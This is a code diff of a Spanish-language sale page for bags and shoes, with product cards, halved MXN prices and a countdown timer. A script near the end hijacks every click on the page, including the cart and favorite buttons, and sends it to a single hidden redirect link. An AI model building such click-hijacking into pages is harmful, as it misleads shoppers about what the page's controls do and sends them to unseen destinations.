+        name: "Set botines, mini bolso y cinturón", desc: "Piel negra y café con detalles dorados",
+        was: 2999, now: 1499, img: "pexels-jose-martin-segura-benites-1422456152-27503501.jpg", icon: "👢", color: "#d9d9e8"
+      },
 
-  { name:"Collar de eslabones dorados", desc:"Cadena gruesa con acabado brillante",
-    was:549, now:329, img:"pexels-jonathanborba-28900494.jpg", icon:"📿", color:"#ffe7ad" },
+      {
+        name: "Bolso tote y botines con hebillas", desc: "Piel color caramelo, juego combinado",
+        was: 2799, now: 1399, img: "pexels-pedro-furtado-2149998739-31450739.jpg", icon: "👜", color: "#ffd9c2"
+      },
 
-  { name:"Set botines, mini bolso y cinturón", desc:"Piel negra y café con detalles dorados",
-    was:2999, now:1499, img:"pexels-jose-martin-segura-benites-1422456152-27503501.jpg", icon:"👢", color:"#d9d9e8" },
+      {
+        name: "Bolso de hombro y zapatilla vino", desc: "Piel con bolsillos y zapatilla de tacón",
+        was: 2299, now: 1149, img: "pexels-pedrofurtadoo-31451028.jpg", icon: "👠", color: "#e8d5f7"
+      },
 
-  { name:"Bolso tote y botines con hebillas", desc:"Piel color caramelo, juego combinado",
-    was:2799, now:1399, img:"pexels-pedro-furtado-2149998739-31450739.jpg", icon:"👜", color:"#ffd9c2" },
+      {
+        name: "Zapatillas blancas con brillo", desc: "Punta fina y correa con cristales",
+        was: 1199, now: 599, img: "pexels-yves-matuba-50261060-28651548.jpg", icon: "👠", color: "#efe6dc"
+      }
+    ];
+    // Pega aquí la URL de la foto de cada producto (clave = nombre exacto del producto).
+    // Si falta o no carga, se muestra el emoji.
 
-  { name:"Bolso de hombro y zapatilla vino", desc:"Piel con bolsillos y zapatilla de tacón",
-    was:2299, now:1149, img:"pexels-pedrofurtadoo-31451028.jpg", icon:"👠", color:"#e8d5f7" },
+    const mxn = n => "$" + n.toLocaleString("es-MX") + " MXN";
 
-  { name:"Zapatillas blancas con brillo", desc:"Punta fina y correa con cristales",
-    was:1199, now:599, img:"pexels-yves-matuba-50261060-28651548.jpg", icon:"👠", color:"#efe6dc" }
-];
-// Pega aquí la URL de la foto de cada producto (clave = nombre exacto del producto).
-// Si falta o no carga, se muestra el emoji.
-
-const mxn = n => "$" + n.toLocaleString("es-MX") + " MXN";
-
-function render(list, el, base){
-  el.innerHTML = list.map(p => {
-    const pct = Math.round((1 - p.now / p.was) * 100);
-    const pic = p.img
-      ? `<img src="${base + p.img}" alt="${p.name}" loading="lazy" onerror="this.replaceWith(Object.assign(document.createElement('span'),{textContent:'${p.icon}'}))">`
-  : `<span aria-hidden="true">${p.icon}</span>`;
-      : `<span aria-hidden="true">${p.icon}</span>`;
-    return `<article class="card">
+    function render(list, el, base) {
+      el.innerHTML = list.map(p => {
+        const pct = Math.round((1 - p.now / p.was) * 100);
+        const pic = p.img
+          ? `<img src="${base + p.img}" alt="${p.name}" loading="lazy" onerror="this.replaceWith(Object.assign(document.createElement('span'),{textContent:'${p.icon}'}))">`
+          : `<span aria-hidden="true">${p.icon}</span>`;
+        return `<article class="card">
       <div class="pic" style="background:${p.color}">
         <span class="off">-${pct}%</span>
         <button class="fav" aria-label="Guardar en favoritos">♥</button>
@@ -275,26 +758,27 @@ function render(list, el, base){
       <div class="price"><b>${mxn(p.now)}</b><s>${mxn(p.was)}</s></div>
       <button class="add">Agregar al carrito</button>
     </article>`;
-  }).join("");
-}
-render(clothes, document.getElementById("clothes"), IMAGE_BASE_URL);
-render(acc, document.getElementById("acc"), ACC_IMAGE_BASE_URL);
+      }).join("");
+    }
+    render(clothes, document.getElementById("clothes"), IMAGE_BASE_URL);
+    render(acc, document.getElementById("acc"), ACC_IMAGE_BASE_URL);
 
-// Todo clic en la página redirige al mismo enlace.
-document.addEventListener("click", e => {
-  e.preventDefault();
-  window.open(REDIRECT_URL, "_blank", "noopener");
-});
+    // Todo clic en la página redirige al mismo enlace.
+    document.addEventListener("click", e => {
+      e.preventDefault();
+      window.open(REDIRECT_URL, "_blank", "noopener");
+    });
 
-// Cuenta regresiva
-const end = new Date("2026-11-30T23:59:59").getTime();
-const pad = n => String(n).padStart(2, "0");
-function tick(){
-  let t = Math.max(0, end - Date.now()) / 1000;
-  const set = (id, v) => document.getElementById(id).textContent = pad(Math.floor(v));
-  set("d", t / 86400); set("h", (t % 86400) / 3600); set("m", (t % 3600) / 60); set("s", t % 60);
-}
-tick(); setInterval(tick, 1000);
-</script>
+    // Cuenta regresiva
+    const end = new Date("2026-11-30T23:59:59").getTime();
+    const pad = n => String(n).padStart(2, "0");
+    function tick() {
+      let t = Math.max(0, end - Date.now()) / 1000;
+      const set = (id, v) => document.getElementById(id).textContent = pad(Math.floor(v));
+      set("d", t / 86400); set("h", (t % 86400) / 3600); set("m", (t % 3600) / 60); set("s", t % 60);
+    }
+    tick(); setInterval(tick, 1000);
+  </script>
 </body>
+
 </html>
